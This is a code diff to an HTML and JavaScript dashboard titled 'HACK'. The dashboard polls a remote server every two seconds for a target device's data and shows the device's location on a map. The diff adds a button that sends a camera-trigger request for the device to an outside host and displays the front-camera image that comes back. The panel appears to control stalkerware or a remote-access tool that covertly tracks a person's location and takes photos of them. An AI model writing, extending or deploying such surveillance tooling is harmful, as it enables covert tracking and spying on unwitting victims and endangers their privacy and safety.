@@ -10,8 +10,11 @@
   th, td { padding: 10px; border: 1px solid #555; text-align: center; }
   th { background: #222; }
   #map { width: 100%; height: 400px; margin-top: 20px; border: 1px solid #555; }
+  #cameraImage { width: 300px; margin-top: 20px; border: 1px solid #555; display:block;}
+  button { padding:10px 15px; margin-top:10px; cursor:pointer; background:#222; color:#fff; border:none; }
 </style>
 </head>
+<body>
 <h1>HACK</h1>
 
 <table>
@@ -30,6 +33,9 @@
 </table>
 
 <div id="map"></div>
+
+<button onclick="captureCamera()">Capture Front Camera</button>
+<img id="cameraImage" src="" alt="Front Camera Image" />
 
 <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY"></script>
 <script>
@@ -59,7 +65,6 @@ async function fetchDeviceData() {
             </tr>
         `;
 
-        // Update map
         if (data.location && data.location !== "Not fetched") {
             const [lat, lng] = data.location.split(",").map(Number);
             const loc = { lat: lat, lng: lng };
@@ -67,15 +72,31 @@ async function fetchDeviceData() {
             marker.setPosition(loc);
             map.setCenter(loc);
         }
+
+        if(data.cameraImage) {
+            document.getElementById("cameraImage").src = "data:image/jpeg;base64," + data.cameraImage;
+        }
+
     } catch (err) {
         document.getElementById("deviceData").innerHTML = `<tr><td colspan="5">Error fetching data</td></tr>`;
         console.error(err);
     }
 }
 
-// Fetch data every 2 seconds
+// Fetch every 2 seconds
 fetchDeviceData();
 setInterval(fetchDeviceData, 2000);
+
+// Capture front camera button click
+function captureCamera() {
+    fetch("https://hack-7tdp.onrender.com/api/device/camera-trigger", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ deviceId: DEVICE_ID })
+    }).then(res => res.json())
+    .then(data => console.log("Camera trigger sent"))
+    .catch(err => console.error(err));
+}
 </script>
 
 </body>
